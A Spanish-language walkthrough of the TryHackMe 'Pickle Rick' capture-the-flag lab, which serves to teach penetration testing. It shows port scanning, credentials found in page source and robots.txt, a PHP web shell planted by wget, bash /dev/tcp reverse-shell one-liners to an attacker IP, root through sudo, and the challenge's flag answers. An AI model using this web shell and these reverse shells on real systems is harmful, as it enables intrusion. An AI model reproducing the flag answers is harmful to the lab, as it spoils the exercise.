---
title: THM - Picklerick
tags: [tryhackme]
---
# THM - Picklerick
![](https://i.imgur.com/BkKtAkO.png)
**Pickle Rick**: A Rick and Morty CTF. Help turn Rick back into a human!

> This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.
>
> Deploy the virtual machine on this task and explore the web application: MACHINE_IP
> 
<https://tryhackme.com/room/picklerick>

## VPN
Para Kali editar el archivo `.ovpn` y rempalzar
~~~shell
...
cipher AES-256-CBC
...
~~~
~~~shell
...
data-ciphers AES-256-CBC
...
~~~

## Enumeración de puertos
~~~shell
$ sudo nmap -p- -sS --open --min-rate 4000 -vvv -n -Pn $IP -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-07 23:36 EDT
Initiating SYN Stealth Scan at 23:36
Scanning 10.10.131.192 [65535 ports]
Discovered open port 80/tcp on 10.10.131.192
Discovered open port 22/tcp on 10.10.131.192
Completed SYN Stealth Scan at 23:36, 19.02s elapsed (65535 total ports)
Nmap scan report for 10.10.131.192
Host is up, received user-set (0.18s latency).
Scanned at 2023-07-07 23:36:14 EDT for 18s
Not shown: 65516 closed tcp ports (reset), 17 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 19.21 seconds
           Raw packets sent: 74666 (3.285MB) | Rcvd: 73412 (2.936MB)
~~~

* 22/tcp ssh
* 80/tcp http

## Código fuente de index
~~~shell
$ curl $IP
~~~
~~~html
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
  <style>
  .jumbotron {
    background-image: url("assets/rickandmorty.jpeg");
    background-size: cover;
    height: 340px;
  }
  </style>
</head>
<body>

  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

</body>
~~~

Acá encontramos un usuario `R1ckRul3s`

## Enumeracipon de rutas
~~~shell
$ nmap -p80 $IP -script http-enum -Pn -oN httpInfo
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-07 23:41 EDT
Nmap scan report for 10.10.131.192
Host is up (0.40s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|_  /robots.txt: Robots file

Nmap done: 1 IP address (1 host up) scanned in 24.81 seconds
~~~

~~~shell
$ curl $IP/robots.txt
Wubbalubbadubdub
~~~

Acá encontramos una contraseña `Wubbalubbadubdub`

Entonces en`login.php` iniciamos sesión

![](https://hackmd.io/_uploads/B1dupILKn.png)

## Ejecución remota de código

Ahora en `/portal.php`

![](https://hackmd.io/_uploads/S1IRp8IKh.png)

![](https://hackmd.io/_uploads/H16-CLUK3.png)

**Flag \#1:** *What is the first ingredient that Rick needs?*: `mr. meeseek hair`

![](https://hackmd.io/_uploads/BkGV1DIFn.png)

~~~plaintext
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
~~~

## Exploración de permisos

~~~shell
$ whoami
www-data
~~~

~~~shell
$ sudo -l
Matching Defaults entries for www-data on ip-10-10-131-192.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-131-192.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
~~~

~~~shell

~~~

## Shell reversa


Permisos de escritura sobre el directorio donde arranca la ejecución de comandos

~~~shell
sudo chown -R www-data:www-data /var/www
~~~

Habilitamos un servidor para pasarle archivos a la máquina remote
~~~shell
cd tmp
python3 -m http.server
~~~

En un arvhico llamado `shell.php` escribimos esto
~~~php
<?php
$cmd = $_GET['cmd'];
system($cmd);
?>
~~~

En el input de portal ejecutamos
~~~shell
wget $IP_de_maquina_atacante:puerto/shell.php 
~~~

~~~shell
ls -al shell.php
-rw-r--r-- 1 www-data www-data 44 Jul  8 05:10 shell.php
~~~

Ahora visitamos `IP/shell.php?cmd=ls`:
~~~plaintext
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
index.html.1
login.php
php-reverse-shell.php
php-shell.php
portal.php
robots.txt
shell.php
~~~



~~~
bash -i >& /dev/tcp/10.18.41.138/5000 0>&1
~~~

~~~
bash -i >%26 /dev/tcp/10.18.41.138/5000 0>%261
~~~

~~~
bash -c 'bash -i >%26 /dev/tcp/10.18.41.138/5000 0>%261'
~~~

Ahora visitamos `IP/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.18.41.138/5000 0>&1'` y notamos que la respeusta HTTP queda pendiente pero en la netcat si recibe la conexión:
~~~shell
$ sudo nc -nvlp 5000                                           
listening on [any] 5000 ...
connect to [10.18.41.138] from (UNKNOWN) [10.10.84.97] 46772
bash: cannot set terminal process group (1347): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-84-97:/var/www/html$ 
~~~


~~~shell
www-data@ip-10-10-84-97:/var/www/html$ tty
tty
not a tty
~~~


~~~shell
www-data@ip-10-10-84-97:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@ip-10-10-84-97:/var/www/html$ tty
tty
/dev/pts/0
www-data@ip-10-10-84-97:/var/www/html$ stty raw -echo;
~~~

~~~shell
www-data@ip-10-10-84-97:/var/www/html$ sudo su
sudo su
root@ip-10-10-84-97:/var/www/html# whoami
whoami
root
root@ip-10-10-84-97:/var/www/html# stty raw -echo;
stty raw -echo;
root@ip-10-10-84-97:/var/www/html# whoami  
root
root@ip-10-10-84-97:/var/www/html# ls ~ 
3rd.txt  snap
root@ip-10-10-84-97:/var/www/html# cat ~/3rd.txt
3rd ingredients: fleeb juice
~~~